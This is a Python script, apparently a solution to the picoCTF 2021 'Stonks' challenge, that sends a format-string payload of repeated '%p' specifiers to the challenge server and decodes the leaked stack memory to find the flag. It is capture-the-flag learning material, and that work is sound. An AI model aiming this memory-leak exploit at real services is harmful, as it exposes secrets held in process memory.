#!/usr/bin python
# from https://ahessmat.netlify.app/post/2021-04-picoctf-2021-writeup-stonks/

import sys
import socket
import time
from pwn import *

hostname = "mercury.picoctf.net"
port = 6989
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))

def testrecv():
	res = ""
	while True:
		data = sock.recv(1024)
		if (not data):
			break
		res += data.decode()
	print(res)
	return res

resp = sock.recv(2048)
content ="A"+ ("%p_" * 301)
sock.send(content.encode())
time.sleep(0.2)
sock.shutdown(socket.SHUT_WR)
hexdump = testrecv()
print("Connection terminated")
sock.close()

hexlist = hexdump.split("-")

print("Starting loop")
ans = b""

for entry in hexlist:
	try:
		hex_string = entry[2:]
		hex_str = int(hex_string, 16)
		test = p32(hex_str)
		ans+=test
	except:
		continue

idx_start = ans.find(b"pico")
idx_end = ans.find(b"}") +1
print(ans)
